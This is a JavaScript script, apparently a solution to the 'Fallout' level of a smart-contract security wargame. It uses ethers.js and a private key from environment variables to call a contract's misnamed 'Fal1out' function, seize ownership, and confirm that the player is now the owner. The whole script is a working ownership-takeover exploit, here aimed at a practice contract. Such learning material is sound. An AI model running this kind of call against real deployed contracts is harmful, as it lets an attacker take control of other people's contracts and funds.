const ethers = require("ethers");
const fs = require("fs");
require("dotenv").config({ path: "./.env" });

async function main() {
  // Create provider - a read-only abstraction to access blockchain data
  const provider = new ethers.providers.InfuraProvider(process.env.NETWORK);
  // Create wallet
  let wallet = new ethers.Wallet(process.env.PRIVATE_KEY);
  // Connect wallet
  let walletSigner = await wallet.connect(provider);
  // Create contract
  const contractAbi = fs.readFileSync("./Fallout.abi", "utf8");
  const contract = new ethers.Contract(
    process.env.CONTRACT_ADDRESS,
    contractAbi,
    walletSigner
  );

  // Check contract's owner
  console.log(`Contract owner is initially: ${await contract.owner()}`);

  // Call contract's 'Fal1out' function
  console.log("Calling contract's 'Fal1out' function...");
  const contractFal1out = await contract.Fal1out();
  contractFal1out.wait(1);

  // Check contract's new owner
  const owner = await contract.owner();
  console.log(`Contract owner is now: ${owner}`);
  console.log(`Contract owner is player: ${owner === wallet.address}`);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
